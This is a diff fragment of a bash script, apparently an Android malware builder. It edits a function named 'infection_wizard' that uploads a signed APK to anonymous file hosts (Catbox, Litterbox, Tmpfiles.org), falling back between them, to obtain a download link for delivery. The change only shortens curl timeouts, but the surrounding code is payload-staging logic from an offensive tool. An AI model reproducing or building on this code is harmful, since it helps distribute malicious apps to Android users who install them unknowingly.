@@ -345,14 +345,14 @@ infection_wizard() {
         read -p "    Enter pre-hosted URL: " DOWNLOAD_URL
     else
         echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
-        DOWNLOAD_URL=$(curl -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php 2>/dev/null)
+        DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php 2>/dev/null)
         if [[ "$DOWNLOAD_URL" != "http"* ]]; then
             echo -e "${YELLOW}[!] Catbox failed/unreachable. Trying Litterbox fallback...${NC}"
-            DOWNLOAD_URL=$(curl -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$SIGNED_APK" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null)
+            DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$SIGNED_APK" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null)
         fi
         if [[ "$DOWNLOAD_URL" != "http"* ]]; then
             echo -e "${YELLOW}[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback...${NC}"
-            local TMP_RESP=$(curl -sS --connect-timeout 10 --max-time 180 -F "file=@$SIGNED_APK" https://tmpfiles.org/api/v1/upload 2>/dev/null)
+            local TMP_RESP=$(curl -sS --connect-timeout 5 --max-time 15 -F "file=@$SIGNED_APK" https://tmpfiles.org/api/v1/upload 2>/dev/null)
             local RAW_TMP=$(echo "$TMP_RESP" | grep -o '"url":"[^"]*' | cut -d'"' -f4)
             if [[ "$RAW_TMP" == *"tmpfiles.org/"* ]]; then
                 DOWNLOAD_URL=$(echo "$RAW_TMP" | sed 's/tmpfiles.org\//tmpfiles.org\/dl\//')
